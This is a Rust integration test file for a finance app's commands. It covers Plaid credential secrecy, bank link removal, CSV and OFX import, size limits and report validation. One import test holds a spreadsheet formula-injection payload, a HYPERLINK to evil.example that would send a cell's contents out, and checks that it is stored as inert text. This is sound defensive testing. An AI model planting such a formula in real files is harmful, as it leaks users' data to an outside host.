//! Money's commands, end to end against a real vault.
//!
//! What is here is what only the command layer decides: that no answer,
//! under any command, carries the Plaid secret or a bank's token; that the
//! edge refuses what is too big before reading it; what an import is told
//! about an account, a currency or a file it cannot read; what a
//! disconnection does when Plaid cannot be told; and which changes the
//! writes announce. The parsing of files has its tests in
//! `money::import`, and the merge of a sync with a person's choices in the
//! core.
//!
//! Nothing here touches the network. Linking a bank and syncing one go to
//! Plaid, so a linked bank is seeded straight into the vault, the way a
//! finished link would have stored it, and every test that has one runs
//! with no Plaid keys -- so that nothing is even tempted to call out.

use everyday_core::TxnId;
use everyday_core::money::{
    AccessToken, AccountKind, BankLink, LinkProvider, PlaidEnvironment, SyncDelta, SyncedAccount,
};
use everyday_service::ctx::Ctx;
use everyday_service::events::{Change, EventSink, Kind, Op};
use everyday_service::{Service, error::CommandError};
use serde_json::{Value, json};
use std::sync::{Arc, Mutex};

#[allow(dead_code)]
mod support;

const CARD_CSV: &str = include_str!("fixtures/money/card-amount.csv");
const QUOTED_CSV: &str = include_str!("fixtures/money/quoted.csv");
const CARD_OFX: &str = include_str!("fixtures/money/card-xml.ofx");
const CHECKING_OFX: &str = include_str!("fixtures/money/checking-sgml.ofx");

/// Distinctive enough that finding them anywhere means they leaked.
const SECRET: &str = "sekrit-9f8e7d6c5b4a-DISTINCTIVE";
const CLIENT_ID: &str = "client-id-ABCDEFGH-WXYZ";
const TOKEN: &str = "access-sandbox-0f1e2d3c-TOKEN";

#[derive(Default)]
struct Collector {
    changes: Mutex<Vec<Change>>,
}

impl EventSink for Collector {
    fn changed(&self, change: Change) {
        self.changes.lock().unwrap().push(change);
    }
}

impl Collector {
    fn take(&self) -> Vec<Change> {
        std::mem::take(&mut *self.changes.lock().unwrap())
    }
}

async fn call(svc: &Arc<Service>, name: &str, args: Value) -> Value {
    svc.call(Ctx::local(), name, args).await.unwrap_or_else(|e| panic!("{name}: {e}"))
}

async fn fails(svc: &Arc<Service>, name: &str, args: Value) -> CommandError {
    svc.call(Ctx::local(), name, args).await.expect_err("expected a failure")
}

/// A bank as a finished link would have stored it -- the link, its token,
/// and one checking account from its first sync.
fn link_a_bank(svc: &Arc<Service>) -> BankLink {
    let vault = svc.get().unwrap();
    let link = BankLink::new(
        LinkProvider::Plaid {
            item_id: "item-sandbox-1".into(),
            institution_id: "ins_109508".into(),
            environment: PlaidEnvironment::Sandbox,
        },
        "Test Bank",
    );
    vault.add_bank_link(&link, &AccessToken(TOKEN.into())).unwrap();
    vault
        .apply_bank_sync(
            link.id,
            &SyncDelta {
                accounts: vec![SyncedAccount {
                    provider_account_id: "acct-sandbox-1".into(),
                    name: "Plaid Checking".into(),
                    official_name: "Plaid Gold Standard 0% Interest Checking".into(),
                    mask: "0000".into(),
                    kind: AccountKind::Cash,
                    subtype: "checking".into(),
                    currency: "USD".into(),
                    balance: Some(11_000),
                    available: Some(10_000),
                    limit: None,
                }],
                upserts: Vec::new(),
                removed: Vec::new(),
            },
        )
        .unwrap();
    link
}

async fn manual_account(svc: &Arc<Service>, name: &str, currency: &str) -> Value {
    call(
        svc,
        "create_manual_account",
        json!({ "name": name, "kind": "cash", "currency": currency }),
    )
    .await
}

async fn import(svc: &Arc<Service>, account: &Value, content: &str) -> Value {
    call(svc, "import_transactions", json!({ "accountId": account["id"], "content": content }))
        .await
}

fn txn_ids(page: &Value) -> Vec<Value> {
    page["txns"].as_array().unwrap().iter().map(|t| t["id"].clone()).collect()
}

// ---- credentials -----------------------------------------------------------

#[tokio::test]
async fn no_answer_from_any_command_carries_the_plaid_secret_or_a_banks_token() {
    let (svc, _dir) = support::vault::service(None);
    let saved = call(
        &svc,
        "save_plaid_credentials",
        json!({ "clientId": CLIENT_ID, "secret": SECRET, "environment": "sandbox" }),
    )
    .await;
    assert_eq!(
        saved,
        json!({ "configured": true, "environment": "sandbox", "clientIdHint": "WXYZ" })
    );

    link_a_bank(&svc);
    let jar = manual_account(&svc, "Card", "USD").await;
    import(&svc, &jar, CARD_CSV).await;
    let page = call(&svc, "list_transactions", json!({ "query": {} })).await;
    let first = txn_ids(&page)[0].clone();

    let mut answers = vec![("save_plaid_credentials", saved)];
    for (name, args) in [
        ("plaid_setup", json!({})),
        ("list_bank_links", json!({})),
        ("list_bank_accounts", json!({})),
        ("list_transactions", json!({ "query": {} })),
        ("get_transaction", json!({ "id": first })),
        ("list_money_categories", json!({})),
        ("list_money_rules", json!({})),
        ("money_month", json!({ "month": "2026-10" })),
        ("money_cash_flow", json!({ "end": "2026-10", "months": 12 })),
        ("money_net_worth", json!({ "from": "2026-01-01", "to": "2026-12-31" })),
        ("money_recurring", json!({})),
        ("preview_import", json!({ "content": CARD_CSV })),
    ] {
        answers.push((name, call(&svc, name, args).await));
    }

    // The client id's last four characters are the most anything says of it.
    let client_id_head = &CLIENT_ID[..CLIENT_ID.len() - 4];
    for (name, answer) in &answers {
        let wire = answer.to_string();
        assert!(!wire.contains(SECRET), "{name} answered the Plaid secret: {wire}");
        assert!(!wire.contains(client_id_head), "{name} answered the client id: {wire}");
        assert!(!wire.contains(TOKEN), "{name} answered a bank's access token: {wire}");
    }
    let links = &answers.iter().find(|(n, _)| *n == "list_bank_links").unwrap().1;
    assert_eq!(links.as_array().unwrap().len(), 1, "the bank is listed, just not its token");
}

#[tokio::test]
async fn cleared_keys_say_nothing_about_what_they_were() {
    let (svc, _dir) = support::vault::service(None);
    call(
        &svc,
        "save_plaid_credentials",
        json!({ "clientId": CLIENT_ID, "secret": SECRET, "environment": "production" }),
    )
    .await;
    call(&svc, "clear_plaid_credentials", json!({})).await;
    let setup = call(&svc, "plaid_setup", json!({})).await;
    assert_eq!(setup, json!({ "configured": false, "clientIdHint": "" }));
}

#[tokio::test]
async fn connecting_a_bank_without_plaid_keys_says_where_to_add_them() {
    let (svc, _dir) = support::vault::service(None);
    let e = fails(&svc, "start_bank_link", json!({})).await;
    assert_eq!(e.code, "invalid");
    assert!(e.message.contains("Settings → Money"), "{}", e.message);
}

#[tokio::test]
async fn cancelling_a_sign_in_nobody_started_is_harmless_and_a_made_up_session_is_refused() {
    let (svc, _dir) = support::vault::service(None);
    let unknown = "0".repeat(64);
    assert_eq!(call(&svc, "cancel_bank_link", json!({ "session": unknown })).await, Value::Null);
    for bad in [String::new(), "   ".to_string(), "x".repeat(10_000)] {
        let e = fails(&svc, "cancel_bank_link", json!({ "session": bad })).await;
        assert_eq!(e.code, "invalid");
        let e = fails(&svc, "check_bank_link", json!({ "session": bad })).await;
        assert_eq!(e.code, "invalid");
    }
}

// ---- links -----------------------------------------------------------------

#[tokio::test]
async fn disconnecting_a_bank_forgets_its_token_even_when_plaid_cannot_be_told() {
    let (svc, _dir) = support::vault::service(None);
    let events = Arc::new(Collector::default());
    svc.set_events(events.clone());
    let vault = svc.get().unwrap();
    let link = link_a_bank(&svc);
    assert!(vault.bank_link_access(link.id).is_ok());

    // No Plaid keys, so Plaid is not told -- and the bank goes anyway.
    call(&svc, "delete_bank_link", json!({ "id": link.id })).await;
    assert!(vault.bank_link_access(link.id).is_err(), "the token outlived its link");
    assert_eq!(call(&svc, "list_bank_links", json!({})).await, json!([]));
    assert_eq!(call(&svc, "list_bank_accounts", json!({})).await, json!([]));
    let changes = events.take();
    assert_eq!(changes.len(), 1, "{changes:?}");
    assert_eq!((changes[0].kind, changes[0].op), (Kind::BankLink, Op::Deleted));
    assert_eq!(changes[0].id, Some(link.id.to_string()));
}

#[tokio::test]
async fn disconnecting_with_the_history_kept_leaves_its_accounts_kept_by_hand() {
    let (svc, _dir) = support::vault::service(None);
    let vault = svc.get().unwrap();
    let link = link_a_bank(&svc);
    call(&svc, "delete_bank_link", json!({ "id": link.id, "keepHistory": true })).await;
    assert!(vault.bank_link_access(link.id).is_err());
    let accounts = call(&svc, "list_bank_accounts", json!({})).await;
    let accounts = accounts.as_array().unwrap();
    assert_eq!(accounts.len(), 1);
    assert_eq!(accounts[0]["name"], "Plaid Checking");
    assert!(accounts[0].get("linkId").is_none(), "{}", accounts[0]);
}

#[tokio::test]
async fn syncing_with_no_bank_connected_answers_nothing() {
    let (svc, _dir) = support::vault::service(None);
    assert_eq!(call(&svc, "sync_bank_links", json!({})).await, json!([]));
}

// ---- importing -------------------------------------------------------------

#[tokio::test]
async fn a_csv_lands_in_an_account_kept_by_hand_once_however_often_it_is_imported() {
    let (svc, _dir) = support::vault::service(None);
    let events = Arc::new(Collector::default());
    svc.set_events(events.clone());
    let card = manual_account(&svc, "Card", "usd").await;
    assert_eq!(card["currency"], "USD");
    events.take();

    let first = import(&svc, &card, CARD_CSV).await;
    assert_eq!(first, json!({ "added": 5, "skipped": 0, "problems": [] }));
    let changes = events.take();
    assert_eq!(changes.len(), 1, "{changes:?}");
    assert_eq!((changes[0].kind, changes[0].op), (Kind::Txn, Op::Created));

    let again = import(&svc, &card, CARD_CSV).await;
    assert_eq!(again, json!({ "added": 0, "skipped": 5, "problems": [] }));
    let page = call(&svc, "list_transactions", json!({ "query": {} })).await;
    assert_eq!(page["total"], 5);
}

#[tokio::test]
async fn the_lines_a_file_could_not_give_are_named_and_the_rest_arrive() {
    let (svc, _dir) = support::vault::service(None);
    let jar = manual_account(&svc, "Jar", "USD").await;
    let report = import(&svc, &jar, QUOTED_CSV).await;
    assert_eq!(report["added"], 5);
    let problems = report["problems"].as_array().unwrap();
    assert_eq!(problems.len(), 2, "{problems:?}");
    assert!(problems[0].as_str().unwrap().starts_with("line 8:"), "{problems:?}");

    // The formula-looking payee is stored as the text it was.
    let page = call(&svc, "list_transactions", json!({ "query": { "text": "HYPERLINK" } })).await;
    assert_eq!(
        page["txns"][0]["payee"],
        "=HYPERLINK(\"http://evil.example/?leak=\"&A1,\"Click me\")"
    );
}

#[tokio::test]
async fn an_ofx_file_lands_once_and_one_in_another_currency_is_refused() {
    let (svc, _dir) = support::vault::service(None);
    let checking = manual_account(&svc, "Checking", "USD").await;
    let first = import(&svc, &checking, CHECKING_OFX).await;
    assert_eq!(first["added"], 5);
    // The same file again, told apart by each line's own id.
    let again = import(&svc, &checking, CHECKING_OFX).await;
    assert_eq!((again["added"].clone(), again["skipped"].clone()), (json!(0), json!(5)));

    let e = fails(
        &svc,
        "import_transactions",
        json!({ "accountId": checking["id"], "content": CARD_OFX }),
    )
    .await;
    assert_eq!(e.code, "invalid");
    assert!(e.message.contains("CAD") && e.message.contains("USD"), "{}", e.message);
    let page = call(&svc, "list_transactions", json!({ "query": {} })).await;
    assert_eq!(page["total"], 5, "nothing from the refused file arrived");
}

#[tokio::test]
async fn a_connected_banks_account_takes_no_file() {
    let (svc, _dir) = support::vault::service(None);
    link_a_bank(&svc);
    let accounts = call(&svc, "list_bank_accounts", json!({})).await;
    let linked = accounts[0].clone();
    assert!(linked.get("linkId").is_some(), "{linked}");
    let e = fails(
        &svc,
        "import_transactions",
        json!({ "accountId": linked["id"], "content": CARD_CSV }),
    )
    .await;
    assert_eq!(e.code, "invalid");
}

#[tokio::test]
async fn a_csv_whose_columns_cannot_be_told_apart_needs_a_mapping() {
    let (svc, _dir) = support::vault::service(None);
    let jar = manual_account(&svc, "Jar", "USD").await;
    // Whole-number amounts with no sign or point read as ids, not money.
    let content = "Corner shop,20261001,300\nBakery,20261002,450\n";
    let e =
        fails(&svc, "import_transactions", json!({ "accountId": jar["id"], "content": content }))
            .await;
    assert_eq!(e.code, "invalid");

    let preview =
        call(&svc, "preview_import", json!({ "content": content, "currency": "usd" })).await;
    assert!(preview.get("mapping").is_none(), "{preview}");
    assert_eq!(preview["rows"].as_array().unwrap().len(), 2);

    let report = call(
        &svc,
        "import_transactions",
        json!({
            "accountId": jar["id"],
            "content": content,
            "mapping": { "date": 1, "amount": 2, "payee": 0, "negate": true },
        }),
    )
    .await;
    assert_eq!(report, json!({ "added": 2, "skipped": 0, "problems": [] }));
    let page = call(&svc, "list_transactions", json!({ "query": {} })).await;
    let amounts: Vec<i64> =
        page["txns"].as_array().unwrap().iter().map(|t| t["amount"].as_i64().unwrap()).collect();
    assert_eq!(amounts, [-45_000, -30_000], "newest first, turned round");
}

#[tokio::test]
async fn a_preview_names_a_bad_currency_and_otherwise_reads_in_the_main_one() {
    let (svc, _dir) = support::vault::service(None);
    let e =
        fails(&svc, "preview_import", json!({ "content": CARD_CSV, "currency": "dollars" })).await;
    assert_eq!(e.code, "invalid");
    manual_account(&svc, "Yen", "JPY").await;
    let preview = call(
        &svc,
        "preview_import",
        json!({ "content": "Date,Payee,Amount\n2026-10-01,Ramen,-1500\n" }),
    )
    .await;
    assert_eq!(preview["sample"][0]["amount"], -1500, "read in yen, the only account's currency");
}

#[tokio::test]
async fn a_file_larger_than_the_limit_is_refused_before_it_is_read() {
    let (svc, _dir) = support::vault::service(None);
    let jar = manual_account(&svc, "Jar", "USD").await;
    let huge = "x".repeat(5 * 1024 * 1024 + 1);
    let e = fails(&svc, "preview_import", json!({ "content": huge })).await;
    assert_eq!(e.code, "too_large");
    let e = fails(&svc, "import_transactions", json!({ "accountId": jar["id"], "content": huge }))
        .await;
    assert_eq!(e.code, "too_large");

    let rows = "2026-10-01,Shop,-1.00\n".repeat(50_002);
    let many = format!("Date,Payee,Amount\n{rows}");
    let e = fails(&svc, "import_transactions", json!({ "accountId": jar["id"], "content": many }))
        .await;
    assert_eq!(e.code, "too_large");
}

// ---- transactions ----------------------------------------------------------

#[tokio::test]
async fn more_ids_than_one_call_may_name_are_refused() {
    let (svc, _dir) = support::vault::service(None);
    let ids: Vec<String> = (0..2001).map(|_| TxnId::new().to_string()).collect();
    let e =
        fails(&svc, "update_transactions", json!({ "ids": ids, "patch": { "note": "x" } })).await;
    assert_eq!(e.code, "invalid");
    let e = fails(&svc, "delete_transactions", json!({ "ids": ids })).await;
    assert_eq!(e.code, "invalid");
    let e = fails(&svc, "list_transactions", json!({ "query": { "categories": ids } })).await;
    assert_eq!(e.code, "invalid");
    let e = fails(&svc, "list_transactions", json!({ "query": { "text": "a".repeat(501) } })).await;
    assert_eq!(e.code, "invalid");
}

#[tokio::test]
async fn transactions_are_changed_and_deleted_in_batches_and_each_batch_is_announced() {
    let (svc, _dir) = support::vault::service(None);
    let events = Arc::new(Collector::default());
    svc.set_events(events.clone());
    let card = manual_account(&svc, "Card", "USD").await;
    import(&svc, &card, CARD_CSV).await;
    let ids = txn_ids(&call(&svc, "list_transactions", json!({ "query": {} })).await);
    events.take();

    let changed = call(
        &svc,
        "update_transactions",
        json!({ "ids": [ids[0], ids[1]], "patch": { "note": "checked" } }),
    )
    .await;
    assert_eq!(changed.as_array().unwrap().len(), 2);
    let changes = events.take();
    assert_eq!(changes.len(), 1, "{changes:?}");
    assert_eq!((changes[0].kind, changes[0].op, changes[0].ids.len()), (Kind::Txn, Op::Updated, 2));
    assert_eq!(call(&svc, "get_transaction", json!({ "id": ids[0] })).await["note"], "checked");

    call(&svc, "delete_transactions", json!({ "ids": [ids[2]] })).await;
    let changes = events.take();
    assert_eq!((changes[0].kind, changes[0].op), (Kind::Txn, Op::Deleted));
    assert_eq!(call(&svc, "list_transactions", json!({ "query": {} })).await["total"], 4);
}

// ---- reports ---------------------------------------------------------------

#[tokio::test]
async fn reports_refuse_a_month_that_is_not_one_and_a_range_upside_down_or_too_long() {
    let (svc, _dir) = support::vault::service(None);
    let long = "9".repeat(1000);
    for month in ["2026-13", "October", "2026", long.as_str()] {
        let e = fails(&svc, "money_month", json!({ "month": month })).await;
        assert_eq!(e.code, "invalid", "{month}");
        assert!(e.message.len() < 200, "a bad month is not echoed whole: {}", e.message);
    }
    let e = fails(&svc, "money_cash_flow", json!({ "end": "soon", "months": 12 })).await;
    assert_eq!(e.code, "invalid");

    for (from, to) in [
        ("2026-12-01", "2026-01-01"),
        ("2010-01-01", "2026-01-01"),
        ("2016-01-01", "2026-01-02"),
        ("nope", "2026-01-01"),
        ("2026-01-01", "2026-02-30"),
    ] {
        let e = fails(&svc, "money_net_worth", json!({ "from": from, "to": to })).await;
        assert_eq!(e.code, "invalid", "{from}..{to}");
    }
    // Exactly ten years is allowed.
    call(&svc, "money_net_worth", json!({ "from": "2016-01-01", "to": "2026-01-01" })).await;

    // The months are held to one through thirty-six.
    let many = call(&svc, "money_cash_flow", json!({ "end": "2026-10", "months": 500 })).await;
    assert_eq!(many.as_array().unwrap().len(), 36);
    let none = call(&svc, "money_cash_flow", json!({ "end": "2026-10", "months": 0 })).await;
    assert_eq!(none.as_array().unwrap().len(), 1);
    assert_eq!(none[0]["month"], "2026-10");
}
